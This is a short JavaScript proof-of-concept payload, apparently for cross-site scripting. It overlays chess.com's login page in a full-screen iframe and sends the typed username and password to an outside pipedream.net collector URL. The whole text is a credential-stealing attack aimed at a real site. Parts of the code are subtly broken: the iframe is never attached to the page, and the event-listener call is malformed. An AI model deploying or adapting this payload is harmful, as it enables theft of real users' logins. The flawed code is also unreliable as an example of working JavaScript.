f = document.createElement("iframe");
f.setAttribute("id", "poc");
f.setAttribute("style", "overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;position:absolute;top:0px;left:0px;right:0px;bottom:0px");
f.src = "https://chess.com/login";
document.getElementsByName("_username")[0];
setTimeout(() => document.getElementsByTagName('iframe')[0].contentDocument.getElementById("login").addEventListener("click"), function() {
    location.replace(`https://eo17vdm4n5qoswh.m.pipedream.net/?ID=${document.getElementsByTagName("iframe")[0].contentDocument.getElementsByTagName('input')[0].value}&PW=${document.getElementsByTagName("iframe")[0].contentDocument.getElementsByTagName('input')[1].value}`)
}, 1000);
